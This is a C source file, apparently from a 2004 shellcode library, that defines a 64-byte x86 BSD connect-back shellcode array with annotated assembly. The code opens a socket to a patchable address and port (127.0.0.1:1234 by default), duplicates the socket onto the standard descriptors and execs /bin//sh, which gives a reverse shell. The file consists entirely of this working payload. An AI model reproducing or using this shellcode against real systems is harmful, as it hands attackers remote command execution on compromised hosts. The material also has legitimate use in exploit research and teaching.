/*
 *  bsd-x86-cntsockcode.c
 *  Copyright 2004 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

#define CNTSOCKADDR 1
#define CNTSOCKPORT 8

char cntsockcode[]=         /*  64 bytes                          */
    "\x68\x7f\x00\x00\x01"  /*  pushl   $0x0100007f               */
    "\x68\xff\x02\x04\xd2"  /*  pushl   $0xd20402ff               */
    "\x89\xe7"              /*  movl    %esp,%edi                 */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x6a\x01"              /*  pushl   $0x01                     */
    "\x6a\x02"              /*  pushl   $0x02                     */
    "\x6a\x10"              /*  pushl   $0x10                     */
    "\xb0\x61"              /*  movb    $0x61,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x57"                  /*  pushl   %edi                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x6a\x62"              /*  pushl   $0x62                     */
    "\x58"                  /*  popl    %eax                      */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x50"                  /*  pushl   %eax                      */
    "\x6a\x5a"              /*  pushl   $0x5a                     */
    "\x58"                  /*  popl    %eax                      */
    "\xcd\x80"              /*  int     $0x80                     */
    "\xff\x4f\xe8"          /*  decl    -0x18(%edi)               */
    "\x79\xf6"              /*  jns     <cntsockcode+34>          */
    "\x68\x2f\x2f\x73\x68"  /*  pushl   $0x68732f2f               */
    "\x68\x2f\x62\x69\x6e"  /*  pushl   $0x6e69622f               */
    "\x89\xe3"              /*  movl    %esp,%ebx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x54"                  /*  pushl   %esp                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x50"                  /*  pushl   %eax                      */
    "\xb0\x3b"              /*  movb    $0x3b,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
;

